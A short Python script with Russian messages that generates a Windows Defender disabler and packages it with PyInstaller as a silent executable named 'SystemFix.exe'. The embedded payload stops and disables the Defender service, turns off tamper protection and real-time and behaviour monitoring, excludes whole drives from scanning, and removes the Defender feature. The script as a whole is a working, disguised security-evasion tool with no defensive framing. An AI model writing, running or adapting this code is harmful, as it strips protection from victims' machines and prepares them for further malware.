import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
        print("PyInstaller уже установлен")
    except ImportError:
        print("Устанавливаем PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_defender_disabler():
    disabler_code = '''import os
import subprocess
import time

def disable_defender():
    subprocess.run(["sc", "config", "WinDefend", "start=", "disabled"], capture_output=True)
    subprocess.run(["sc", "stop", "WinDefend"], capture_output=True)
    subprocess.run(["reg", "add", "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features", "/v", "TamperProtection", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True)
    subprocess.run(["powershell", "-Command", "Add-MpPreference -ExclusionPath 'C:\\\\'"], capture_output=True)
    subprocess.run(["powershell", "-Command", "Add-MpPreference -ExclusionPath 'D:\\\\'"], capture_output=True)
    subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], capture_output=True)
    subprocess.run(["powershell", "-Command", "Set-MpPreference -MAPSReporting 0"], capture_output=True)
    subprocess.run(["powershell", "-Command", "Set-MpPreference -SubmitSamplesConsent 2"], capture_output=True)
    subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true"], capture_output=True)
    subprocess.run(["dism", "/online", "/disable-feature", "/featurename:Windows-Defender", "/Remove", "/NoRestart"], capture_output=True)

disable_defender()
'''

    with open('defender_disabler.py', 'w', encoding='utf-8') as f:
        f.write(disabler_code)
    print("Файл defender_disabler.py создан")

def compile_to_exe():
    print("Компилируем в EXE...")
    result = os.system('pyinstaller --onefile --noconsole --name SystemFix defender_disabler.py')
    if result == 0:
        print("Успешно! Файл SystemFix.exe создан в папке dist/")
    else:
        print("Ошибка компиляции")

if __name__ == "__main__":
    install_pyinstaller()
    create_defender_disabler()
    compile_to_exe()
